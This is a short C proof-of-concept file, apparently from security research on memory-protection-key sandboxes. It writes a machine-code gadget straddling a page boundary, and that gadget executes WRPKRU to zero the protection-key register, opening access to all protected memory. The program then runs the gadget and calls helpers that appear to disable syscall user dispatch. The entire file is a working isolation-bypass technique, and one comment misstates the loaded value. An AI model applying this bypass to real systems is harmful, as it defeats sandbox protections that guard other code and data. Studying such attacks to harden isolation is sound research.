#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>

#include "_libattack.h"

int main(int argc, char **argv) {
    const int offset = 14;
    int r;

    char *p1 = (char*)mmap(0, PAGE_SIZE*2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    char* location = p1+4096-offset;

    unsigned char unlock[19] = {
            0x50, 0x52, 0x51, // push rax, rdx, rcx
            0x31, 0xc9,  // xor ecx, ecx
            0x31, 0xd2,  // xor edx, edx
            0xb8, 0x00, 0x0, 0x0, 0x0, // mov eax,0x55555550
            0x0f, 0x01, 0xef, // wrpku
            0x59, 0x5a, 0x58, // pop rcx, rdx, rax
            0xc3, // ret
        };


    memcpy(location, unlock, 19);

    r = mprotect(p1, PAGE_SIZE*2, PROT_READ|PROT_EXEC);
    printf("mprotect(p1) = %p\n", location);
    printf("calling p1\n");
    void (*fun_ptr)(void) = (void(*)(void))location;
    fun_ptr();

    disable_sud();
    sud_test();

    return 0;
}